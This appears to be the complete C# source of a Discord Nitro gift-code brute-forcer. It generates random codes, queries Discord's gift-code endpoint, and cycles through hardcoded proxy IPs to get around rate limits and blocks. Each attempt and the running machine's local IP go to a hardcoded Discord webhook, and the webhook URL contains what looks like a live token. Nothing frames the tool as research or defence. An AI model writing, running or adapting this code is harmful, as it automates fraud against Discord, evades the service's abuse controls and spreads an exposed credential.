using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using MyUnicalLib;
using Newtonsoft.Json;


namespace DiscordNitroV2
{
    internal class Program
    {
        static string[] proxyes =
        {
            "8.219.97.248",
            "167.114.107.37",
            "152.99.145.25",
            "96.114.36.9",
            "210.211.113.36",
            "4.144.136.15"
        };

        static int proxy_now = 0;

        static string code = "";

        static void Main(string[] args)
        {
            Console.WriteLine("Enter proxi server start (0-5): ");
            proxy_now = Convert.ToInt32(Console.ReadLine());
            Start("");
        }

        static void Start(string code_new)
        {
            if (code_new != "")
            {
                string a = Do(code_new, proxy_now);
                SendWebHook($"CODE: {code_new} DEBUG: {a} FOR IP: {GetIp()} PROXY NOW: {proxy_now}");
                if (a != "") Console.WriteLine(a + " for code: " + code_new);
                if (a.Contains("500"))
                {
                    Console.WriteLine($"CHANGING PROXY SERVER!");
                    if (proxy_now < proxyes.Length - 1) proxy_now = proxy_now + 1;
                    else proxy_now = 0;
                    Start("");
                }
                if (a.Contains("502")) { Start(""); }
                if (a.Contains("503")) { Start(""); }
                if (a.Contains("504")) { Start(""); }
                if (a.Contains("400") || a.Contains("405") || a.Contains("Невозможно соединиться с удаленным сервером") || a.Contains("Базовое соединение закрыто: Непредвиденная ошибка при приеме."))
                {
                    Console.WriteLine($"CHANGING PROXY SERVER!");
                    if (proxy_now < proxyes.Length - 1) proxy_now = proxy_now + 1;
                    else proxy_now = 0;
                    Start("");
                }
                if (a.Contains("403"))
                {
                    Console.WriteLine($"ACCESS FORBIDEN! CHANGE PROXY SERVER!");
                    if (proxy_now < proxyes.Length - 1) proxy_now = proxy_now + 1;
                    else proxy_now = 0;
                    Start("");
                }
                if (a == "") { Start(code_new); }
                if (a.Contains("limited"))
                {
                    Console.WriteLine($"RATE LIMITED! CHANGE PROXY SERVER!");
                    if (proxy_now < proxyes.Length - 1) proxy_now = proxy_now + 1;
                    else proxy_now = 0;
                    Start("");
                }
                if (!a.Contains("err:not_found"))
                {
                    Console.WriteLine($"GOT IT! discord.gift/{code_new}");
                    //Console.WriteLine("err:not_found");
                    Console.ReadLine();
                    SendWebHook($"@everyone GOT IT! discord.gift/{code_new}");
                    Start("");
                }
                else Start("");
            }
            else
            {
                code = GenCode(16);
                string a = Do(code, proxy_now);
                SendWebHook($"CODE: {code} DEBUG: {a} FOR IP: {GetIp()} PROXY NOW: {proxy_now}");
                if (a != "") Console.WriteLine(a + " for code: " + code);
                if (a.Contains("500"))
                {
                    Console.WriteLine($"CHANGING PROXY SERVER!");
                    if (proxy_now < proxyes.Length - 1) proxy_now = proxy_now + 1;
                    else proxy_now = 0;
                    Start("");
                }
                if (a.Contains("502")) { Start(""); }
                if (a.Contains("503")) { Start(""); }
                if (a.Contains("504")) { Start(""); }
                if (a.Contains("400") || a.Contains("405") || a.Contains("Невозможно соединиться с удаленным сервером") || a.Contains("Базовое соединение закрыто: Непредвиденная ошибка при приеме."))
                {
                    Console.WriteLine($"CHANGING PROXY SERVER!");
                    if (proxy_now < proxyes.Length - 1) proxy_now = proxy_now + 1;
                    else proxy_now = 0;
                    Start("");
                }
                if (a.Contains("403"))
                {
                    Console.WriteLine($"ACCESS FORBIDEN! CHANGE PROXY SERVER!");
                    if (proxy_now < proxyes.Length - 1) proxy_now = proxy_now + 1;
                    else proxy_now = 0;
                    Start("");
                }
                if (a == "") { Start(code); }
                if (a.Contains("limited"))
                {
                    Console.WriteLine($"RATE LIMITED! CHANGE PROXY SERVER!");
                    if (proxy_now < proxyes.Length - 1) proxy_now = proxy_now + 1;
                    else proxy_now = 0;
                    Start("");
                }
                if (!a.Contains("err:not_found"))
                {
                    Console.WriteLine($"GOT IT! discord.gift/{code}");
                    //Console.WriteLine("err:not_found");
                    SendWebHook($"@everyone GOT IT! discord.gift/{code}");
                    Console.ReadLine();
                    Start("");
                }
                else Start("");
            }
        }
        

        static string Do(string code, int proxi_num)
        {
            string a = ProxyApi.Get($"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true", $"http://{proxyes[proxi_num]}:80").GetAwaiter().GetResult();
            return a;
        }

        static string GenCode(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random();

            char[] randomArray = new char[length];
            for (int i = 0; i < length; i++)
            {
                randomArray[i] = chars[random.Next(chars.Length)];
            }

            return new string(randomArray);
        }

        static async void SendWebHook(string msg)
        {
            var SuccessWebHook = new
            {
                username = "Found Nitro!",
                content = msg,
                avatar_url = "https://cdn.shopify.com/s/files/1/0185/5092/products/persons-0041_large.png?v=1369543932",
            };

            var content = new StringContent(JsonConvert.SerializeObject(SuccessWebHook), Encoding.UTF8, "application/json");

            var client = new HttpClient();
            await client.PostAsync("https://discord.com/api/webhooks/1211726958983909417/BN7XddoAj5OrG0hHIDPp0_uQl_OlVLG7ITIhsx4OV-e6Vx7PVWYqeCE7388ZhD3DT6j_", content);
        }

        public static string GetIp()
        {
            string returnIp = "";
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    returnIp = ip.ToString();
                }
            }
            return returnIp;
        }
    }
}
